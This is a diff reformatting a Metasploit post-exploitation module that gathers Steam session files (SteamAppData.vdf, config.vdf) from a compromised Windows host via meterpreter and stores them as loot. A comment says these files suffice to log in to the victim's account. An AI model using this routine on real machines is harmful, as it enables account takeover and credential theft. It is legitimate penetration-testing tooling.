@@ -1,25 +1,39 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Windows Gather Steam Client Session Collector.',
-      'Description'    => %q{ This module will collect Steam session information from an
-        account set to autologin. },
-      'License'        => MSF_LICENSE,
-      'Author'         => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
-      'Platform'       => ['win'],
-      'SessionTypes'   => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Steam Client Session Collector.',
+        'Description' => %q{
+          This module will collect Steam session information from an
+          account set to autologin.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_config_getenv
+            ]
+          }
+        }
+      )
+    )
   end
 
   # All that is needed to login to another Steam account is config.vdf,
@@ -35,14 +49,14 @@ class MetasploitModule < Msf::Post
   def run
     steamappdata = 'SteamAppData.vdf'
     steamconfig = 'config.vdf'
-    u_rx = /AutoLoginUser\W*\"(.*)\"/
+    u_rx = /AutoLoginUser\W*"(.*)"/
 
     # Steam client is only 32 bit so we need to know what arch we are on so that we can use
     # the correct program files folder.
     # We will just use an x64 only defined env variable to check.
     progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
     progfilesx86 = progfiles_env['ProgramFiles(X86)']
-    if not progfilesx86.blank? and progfilesx86 !~ /%ProgramFiles\(X86\)%/
+    if !progfilesx86.blank? && progfilesx86 !~ (/%ProgramFiles\(X86\)%/)
       progs = progfilesx86 # x64
     else
       progs = progfiles_env['ProgramFiles'] # x86
@@ -53,25 +67,21 @@ class MetasploitModule < Msf::Post
 
     # Check if all the files are there.
     if directory?(path) && file?("#{path}\\#{steamappdata}") && file?("#{path}\\#{steamconfig}")
-      print_status("Located steam config files.")
+      print_status('Located steam config files.')
       sad = read_file("#{path}\\#{steamappdata}")
-      if sad =~ /RememberPassword\W*\"1\"/
+      if sad =~ /RememberPassword\W*"1"/
         print_status("RememberPassword is set! Accountname is #{u_rx.match(sad)[1]}")
         scd = read_file("#{path}\\#{steamconfig}")
-        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, filename=steamappdata)
+        steam_app_data_path = store_loot('steam.config', 'text/plain', session, sad, steamappdata)
         print_good("The file SteamAppData.vdf has been stored on #{steam_app_data_path}")
-        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, filename=steamconfig)
+        steam_config_path = store_loot('steam.config', 'text/plain', session, scd, steamconfig)
         print_good("The file config.vdf has been stored on #{steam_config_path}")
-        print_status("Steam configs harvested successfully!")
+        print_status('Steam configs harvested successfully!')
       else
-        print_error("RememberPassword is not set, exiting.")
-        return
+        print_error('RememberPassword is not set, exiting.')
       end
     else
-      print_error("Steam configs not found.")
-      return
+      print_error('Steam configs not found.')
     end
-
   end
-
 end
